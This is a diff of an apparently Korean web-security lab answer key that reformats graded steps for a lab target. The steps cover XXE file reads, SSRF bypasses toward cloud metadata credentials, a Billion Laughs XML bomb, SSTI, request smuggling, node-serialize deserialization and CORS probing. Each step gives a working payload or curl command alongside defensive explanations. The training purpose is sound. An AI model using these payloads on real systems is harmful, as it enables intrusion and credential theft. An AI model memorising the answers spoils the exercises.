@@ -53,8 +53,7 @@ steps:
   hint: <!DOCTYPE> 선언에 ENTITY를 정의하고, SYSTEM 키워드로 파일을 참조한다
   category: exploit
   points: 10
-  answer: "cat > /tmp/xxe_payload.xml << 'XMLEOF'\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/hostname\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>\n\
-    XMLEOF\ncat /tmp/xxe_payload.xml"
+  answer: "cat > /tmp/xxe_payload.xml << 'XMLEOF'\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/hostname\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>\nXMLEOF\ncat /tmp/xxe_payload.xml"
   answer_detail: XXE 인젝션은 XML 파서가 외부 엔티티를 처리하도록 악용하는 공격이다. SYSTEM 키워드로 file://, http://, ftp:// 등의 프로토콜을 통해 파일 읽기, SSRF, DoS(Billion Laughs) 등이 가능하다. 방어를 위해 XML 파서에서 외부 엔티티 처리를 비활성화해야 한다.
   verify:
     type: output_contains
@@ -66,7 +65,7 @@ steps:
   hint: 'curl -X POST -H ''Content-Type: application/xml'' -d @파일 형태로 전송한다'
   category: exploit
   points: 10
-  answer: 'curl -s -X POST -H ''Content-Type: application/xml'' -d @/tmp/xxe_payload.xml http://10.20.30.80:3000/api/Products'
+  answer: "curl -s \\\n     -X POST \\\n     -H 'Content-Type: application/xml' \\\n     -d @/tmp/xxe_payload.xml http://10.20.30.80:3000/api/Products"
   answer_detail: XXE 페이로드를 XML을 처리하는 엔드포인트에 전송하면, XML 파서가 엔티티를 확장하면서 파일 내용이 응답에 포함된다. JSON API라도 Content-Type을 application/xml로 변경하면 XML 파서가 동작하는 경우가 있다. 이를 Content-Type 전환 공격이라 한다.
   verify:
     type: output_contains
@@ -102,8 +101,7 @@ steps:
   hint: 127.0.0.1 = 0x7f000001 = 2130706433 = 0177.0.0.1 등 다양한 표현이 가능하다
   category: exploit
   points: 10
-  answer: 'echo ''=== SSRF IP Bypass Techniques ==='' && echo ''1. Decimal: http://2130706433:3000/'' && echo ''2. Hex: http://0x7f000001:3000/'' && echo ''3. Octal: http://0177.0.0.1:3000/'' && echo ''4.
-    IPv6: http://[::1]:3000/'' && echo ''5. Short: http://127.1:3000/'' && echo ''6. DNS rebinding: attacker.com -> 127.0.0.1'' && curl -s -o /dev/null -w ''%{http_code}'' ''http://10.20.30.80:3000/profile/image/url?url=http://2130706433:3000/'''
+  answer: 'echo ''=== SSRF IP Bypass Techniques ==='' && echo ''1. Decimal: http://2130706433:3000/'' && echo ''2. Hex: http://0x7f000001:3000/'' && echo ''3. Octal: http://0177.0.0.1:3000/'' && echo ''4. IPv6: http://[::1]:3000/'' && echo ''5. Short: http://127.1:3000/'' && echo ''6. DNS rebinding: attacker.com -> 127.0.0.1'' && curl -s -o /dev/null -w ''%{http_code}'' ''http://10.20.30.80:3000/profile/image/url?url=http://2130706433:3000/'''
   answer_detail: SSRF 방어에서 127.0.0.1이나 내부 IP를 차단하는 블랙리스트 방식은 다양한 IP 표현으로 우회된다. 10진수(2130706433), 16진수(0x7f000001), 8진수(0177), 축약형(127.1), IPv6 매핑(::ffff:127.0.0.1), DNS 리바인딩 등이 있다. 안전한 방어는 화이트리스트 방식이다.
   verify:
     type: output_contains
@@ -115,8 +113,7 @@ steps:
   hint: http://169.254.169.254/latest/meta-data/ 경로로 메타데이터에 접근한다
   category: exploit
   points: 10
-  answer: 'echo ''=== Cloud Metadata SSRF ==='' && echo ''AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/'' && echo ''GCP: http://metadata.google.internal/computeMetadata/v1/'' &&
-    echo ''Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01'' && curl -s -o /dev/null -w ''%{http_code}'' ''http://10.20.30.80:3000/profile/image/url?url=http://169.254.169.254/latest/meta-data/'''
+  answer: 'echo ''=== Cloud Metadata SSRF ==='' && echo ''AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/'' && echo ''GCP: http://metadata.google.internal/computeMetadata/v1/'' && echo ''Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01'' && curl -s -o /dev/null -w ''%{http_code}'' ''http://10.20.30.80:3000/profile/image/url?url=http://169.254.169.254/latest/meta-data/'''
   answer_detail: 클라우드 환경에서 SSRF의 가장 치명적인 활용은 메타데이터 서비스 접근이다. AWS의 169.254.169.254에서 IAM 역할의 임시 자격증명(Access Key, Secret Key, Token)을 획득하면 전체 AWS 계정을 장악할 수 있다. Capital One 해킹(2019)이 대표적 사례이다.
   verify:
     type: output_contains
@@ -128,9 +125,8 @@ steps:
   hint: 엔티티가 다른 엔티티를 참조하여 기하급수적으로 확장되도록 구성한다
   category: exploit
   points: 10
-  answer: "cat > /tmp/xxe_dos.xml << 'XMLEOF'\n<?xml version=\"1.0\"?>\n<!DOCTYPE lolz [\n  <!ENTITY lol \"lol\">\n  <!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n  <!ENTITY lol3\
-    \ \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n  <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n]>\n<root>&lol4;</root>\nXMLEOF\necho 'Billion\
-    \ Laughs payload created (NOT executed for safety)' && echo 'Expansion: 10^3 = 1000x amplification at level 4' && cat /tmp/xxe_dos.xml"
+  answer: "cat > /tmp/xxe_dos.xml << 'XMLEOF'\n<?xml version=\"1.0\"?>\n<!DOCTYPE lolz [\n  <!ENTITY lol \"lol\">\n  <!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n  <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n  <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n]>\n<root>&lol4;</root>\nXMLEOF\necho 'Billion Laughs\
+    \ payload created (NOT executed for safety)' && echo 'Expansion: 10^3 = 1000x amplification at level 4' && cat /tmp/xxe_dos.xml"
   answer_detail: Billion Laughs(XML Bomb)는 재귀적 엔티티 참조로 메모리를 기하급수적으로 소비하는 DoS 공격이다. 10단계 중첩 시 10^9(10억)배로 확장되어 수 KB의 XML이 수 GB의 메모리를 소비한다. 방어를 위해 엔티티 확장 깊이와 크기를 제한하거나, 외부 엔티티를 비활성화한다.
   verify:
     type: output_contains
@@ -142,8 +138,7 @@ steps:
   hint: '{{7*7}}이 49로 평가되면 SSTI 취약점이 존재한다'
   category: exploit
   points: 10
-  answer: 'curl -s ''http://10.20.30.80:3000/rest/products/search?q=%7B%7B7*7%7D%7D'' && echo '''' && curl -s ''http://10.20.30.80:3000/rest/products/search?q=${7*7}'' && echo '''' && echo ''SSTI test:
-    if 49 appears in response, template injection exists'''
+  answer: 'curl -s ''http://10.20.30.80:3000/rest/products/search?q=%7B%7B7*7%7D%7D'' && echo '''' && curl -s ''http://10.20.30.80:3000/rest/products/search?q=${7*7}'' && echo '''' && echo ''SSTI test: if 49 appears in response, template injection exists'''
   answer_detail: 'SSTI는 사용자 입력이 서버 측 템플릿 엔진(Jinja2, Twig, Freemarker 등)에 직접 삽입되는 취약점이다. {{7*7}}=49가 응답에 포함되면 확인된다. RCE(원격 코드 실행)로 이어질 수 있어 매우 위험하다. 엔진별로 다른 페이로드(${}, #{}, <% %> 등)를 테스트해야 한다.'
   verify:
     type: output_contains
@@ -155,10 +150,8 @@ steps:
   hint: 'Content-Length와 Transfer-Encoding: chunked를 동시에 사용하여 프론트엔드와 백엔드의 파싱 차이를 악용한다'
   category: exploit
   points: 10
-  answer: 'echo ''=== HTTP Request Smuggling (CL.TE) ==='' && echo ''POST / HTTP/1.1'' && echo ''Host: 10.20.30.80'' && echo ''Content-Length: 13'' && echo ''Transfer-Encoding: chunked'' && echo '''' &&
-    echo ''0'' && echo '''' && echo ''SMUGGLED'' && echo '''' && echo ''Front-end uses Content-Length, Back-end uses Transfer-Encoding'' && echo ''Result: SMUGGLED becomes start of next request'''
-  answer_detail: 'HTTP Request Smuggling은 프론트엔드(프록시/WAF)와 백엔드 서버가 요청 경계를 다르게 해석하는 차이를 악용한다. CL.TE 방식은 프론트엔드가 Content-Length를, 백엔드가 Transfer-Encoding: chunked를 우선하는 경우에 발생한다. 캐시 포이즈닝, 접근 제어 우회, 자격증명 탈취 등에
-    활용된다.'
+  answer: 'echo ''=== HTTP Request Smuggling (CL.TE) ==='' && echo ''POST / HTTP/1.1'' && echo ''Host: 10.20.30.80'' && echo ''Content-Length: 13'' && echo ''Transfer-Encoding: chunked'' && echo '''' && echo ''0'' && echo '''' && echo ''SMUGGLED'' && echo '''' && echo ''Front-end uses Content-Length, Back-end uses Transfer-Encoding'' && echo ''Result: SMUGGLED becomes start of next request'''
+  answer_detail: 'HTTP Request Smuggling은 프론트엔드(프록시/WAF)와 백엔드 서버가 요청 경계를 다르게 해석하는 차이를 악용한다. CL.TE 방식은 프론트엔드가 Content-Length를, 백엔드가 Transfer-Encoding: chunked를 우선하는 경우에 발생한다. 캐시 포이즈닝, 접근 제어 우회, 자격증명 탈취 등에 활용된다.'
   verify:
     type: output_contains
     expect: HTTP Request Smuggling
@@ -176,8 +169,7 @@ steps:
     JSONEOF
 
     cat /tmp/deser_payload.json && echo '''' && echo ''When deserialized by node-serialize, the function auto-executes (IIFE pattern)'''
-  answer_detail: 안전하지 않은 역직렬화(Insecure Deserialization)는 신뢰할 수 없는 데이터를 객체로 복원할 때 발생한다. Node.js의 node-serialize는 _$$ND_FUNC$$_ 접두사로 함수를 직렬화/역직렬화하며, ()를 추가하면 역직렬화 시 자동 실행된다. Java(Apache Commons), Python(pickle),
-    PHP(unserialize)에서도 유사한 취약점이 존재한다.
+  answer_detail: 안전하지 않은 역직렬화(Insecure Deserialization)는 신뢰할 수 없는 데이터를 객체로 복원할 때 발생한다. Node.js의 node-serialize는 _$$ND_FUNC$$_ 접두사로 함수를 직렬화/역직렬화하며, ()를 추가하면 역직렬화 시 자동 실행된다. Java(Apache Commons), Python(pickle), PHP(unserialize)에서도 유사한 취약점이 존재한다.
   verify:
     type: output_contains
     expect: Insecure Deserialization
@@ -188,8 +180,7 @@ steps:
   hint: 'Upgrade: websocket 헤더와 Connection: Upgrade 헤더를 포함한다'
   category: exploit
   points: 10
-  answer: 'curl -s -i -N -H ''Connection: Upgrade'' -H ''Upgrade: websocket'' -H ''Sec-WebSocket-Version: 13'' -H ''Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ=='' http://10.20.30.80:3000/socket.io/ 2>&1
-    | head -20'
+  answer: "curl -s -i -N \\\n  -H 'Connection: Upgrade' \\\n  -H 'Upgrade: websocket' \\\n  -H 'Sec-WebSocket-Version: 13' \\\n  -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' http://10.20.30.80:3000/socket.io/ 2>&1 \\\n | head -20"
   answer_detail: WebSocket은 HTTP 업그레이드를 통해 양방향 통신을 수립한다. WebSocket 연결은 일반적으로 CORS, CSRF 토큰 검증이 적용되지 않아 Cross-Site WebSocket Hijacking(CSWSH) 공격에 취약할 수 있다. 또한 WebSocket 메시지에 대한 입력 검증이 누락되면 인젝션 공격이 가능하다.
   verify:
     type: output_contains
@@ -201,7 +192,7 @@ steps:
   hint: '-H ''Origin: https://evil.com'' 헤더를 포함하여 응답의 Access-Control-Allow-Origin을 확인한다'
   category: exploit
   points: 10
-  answer: 'curl -s -I -H ''Origin: https://evil.com'' http://10.20.30.80:3000/rest/products/search?q=test | grep -i ''access-control'''
+  answer: "curl -s -I \\\n  -H 'Origin: https://evil.com' http://10.20.30.80:3000/rest/products/search?q=test \\\n | grep -i 'access-control'"
   answer_detail: 'CORS 설정 오류는 Access-Control-Allow-Origin이 요청의 Origin을 그대로 반사(reflect)하거나, 와일드카드(*)와 함께 credentials: true를 허용하는 경우 발생한다. 공격자는 악성 사이트에서 피해자의 브라우저를 통해 대상 API에 인증된 요청을 보내고 응답을 읽을 수 있다.'
   verify:
     type: output_contains
@@ -213,10 +204,8 @@ steps:
   hint: SSRF, XXE, SSTI, Smuggling, Deserialization, WebSocket, CORS 취약점을 분류하여 정리한다
   category: analysis
   points: 10
-  answer: 'echo -e ''=== Advanced Web Vulnerabilities Report ===\n\n[Critical Risk]\n1. SSRF: Internal service access, cloud metadata theft\n   Defense: URL whitelist, disable unnecessary protocols\n2.
-    XXE: File read, SSRF chaining, DoS\n   Defense: Disable external entities in XML parser\n3. Deserialization: Remote code execution\n   Defense: Never deserialize untrusted data\n\n[High Risk]\n4. SSTI:
-    Template-based RCE\n   Defense: Sandbox templates, input validation\n5. Request Smuggling: WAF bypass, cache poisoning\n   Defense: Normalize HTTP parsing, disable HTTP/1.1 reuse\n\n[Medium Risk]\n6.
-    WebSocket Hijacking: Unauthorized actions\n   Defense: Validate Origin header, use CSRF tokens\n7. CORS Misconfiguration: Data theft via browser\n   Defense: Strict origin whitelist, avoid reflect pattern''
+  answer: 'echo -e ''=== Advanced Web Vulnerabilities Report ===\n\n[Critical Risk]\n1. SSRF: Internal service access, cloud metadata theft\n   Defense: URL whitelist, disable unnecessary protocols\n2. XXE: File read, SSRF chaining, DoS\n   Defense: Disable external entities in XML parser\n3. Deserialization: Remote code execution\n   Defense: Never deserialize untrusted data\n\n[High Risk]\n4. SSTI:
+    Template-based RCE\n   Defense: Sandbox templates, input validation\n5. Request Smuggling: WAF bypass, cache poisoning\n   Defense: Normalize HTTP parsing, disable HTTP/1.1 reuse\n\n[Medium Risk]\n6. WebSocket Hijacking: Unauthorized actions\n   Defense: Validate Origin header, use CSRF tokens\n7. CORS Misconfiguration: Data theft via browser\n   Defense: Strict origin whitelist, avoid reflect pattern''
     > /tmp/web_adv_report.txt && cat /tmp/web_adv_report.txt'
   answer_detail: 서버 측 웹 취약점은 클라이언트 측보다 영향이 크다. SSRF→메타데이터→클라우드 장악, XXE→SSRF 체이닝, Deserialization→RCE 등 체이닝을 통해 피해가 확대된다. 방어는 입력 검증, 최소 권한, 화이트리스트 접근 방식을 일관되게 적용해야 한다.
   verify:
